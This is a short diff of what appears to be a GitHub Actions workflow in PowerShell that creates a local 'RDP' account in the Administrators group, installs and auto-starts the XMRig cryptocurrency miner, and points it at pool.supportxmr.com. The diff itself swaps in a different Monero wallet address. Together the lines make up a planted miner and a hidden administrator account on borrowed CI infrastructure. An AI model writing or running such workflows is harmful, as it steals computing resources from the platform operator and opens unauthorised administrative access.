@@ -17,7 +17,7 @@ jobs:
           New-LocalUser -Name "RDP" -Password $securePass -AccountNeverExpires
           Add-LocalGroupMember -Group "Administrators" -Member "RDP"
 
-      - name: Install, Configure, and Set Auto-Start
+      - name: Install, Configure, and Set Auto-Start LLLLLLL
         shell: powershell
         run: |
           $ErrorActionPreference = "Stop"
@@ -33,7 +33,7 @@ jobs:
           $minerFolder = (Get-ChildItem -Path $desktopPath -Directory | Where-Object { $_.Name -like 'xmrig*' }).FullName
           if (-not $minerFolder) { throw "CRITICAL: Could not find extracted XMRig folder!" }
           
-          $jsonContent = '{"autosave": true,"cpu": true,"opencl": false,"cuda": false,"pools": [{"algo": "rx/0","url": "pool.supportxmr.com:5555","user": "4A1wDKyYuVkXB6xmzvN9KgedCeaVjuUAbbYiL7S8xAxwSr2S8riNqCD45djZVLuvHYF1kqKayBhFFXBXiNXqUGhwQbjFcZy","pass": "x"}]}'
+          $jsonContent = '{"autosave": true,"cpu": true,"opencl": false,"cuda": false,"pools": [{"algo": "rx/0","url": "pool.supportxmr.com:5555","user": "49UWTwnrxNXi8eMTCqdC5U3eiMHrPZkvvbsYN3WEde4o9RYebixumBCCy5oCdoSKkS2U6t9gXJFzJNkxXC7tJ1Uq4uky5BP","pass": "x"}]}'
           $jsonContent | ConvertFrom-Json | ConvertTo-Json -Depth 100 | Set-Content -Path (Join-Path $minerFolder "config.json")
 
           $batPath = Join-Path $desktopPath "Start-Miner.bat"
